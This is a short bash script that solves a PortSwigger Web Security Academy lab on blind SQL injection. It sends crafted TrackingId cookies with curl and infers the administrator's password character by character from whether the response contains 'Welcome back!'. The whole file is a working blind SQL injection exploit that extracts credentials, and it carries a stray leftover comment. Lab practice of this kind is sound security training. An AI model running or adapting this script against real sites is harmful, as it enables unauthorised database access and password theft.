#!/bin/bash
# LAB LINK: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

pos=1
# Create an array containing the characters from 0 to 9 and a to z
characters=( {a..z} {0..9} )
password=''
# Loop through the array and increment the second variable
for ((i = 0; i < ${#characters[@]}; i++)); do
    value="${characters[i]}"
    result=$(curl -H "Cookie: TrackingId=dummy' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'),$pos,1) = '$value" -s https://0af1000d03874ef780481c7d00f40014.web-security-academy.net/login | grep -q 'Welcome back!' && echo '1' || echo '0')  # Replace "your_command_here" with the command you want to execute
    echo "ch:$value,result:$result"
    if [[ $result == '1' ]]; then
        ((pos++))
        password+=$value
        echo "Found: $value"
        i=-1  # Reset the index to start the loop from the beginning
    
    fi
done
echo "password: $password"
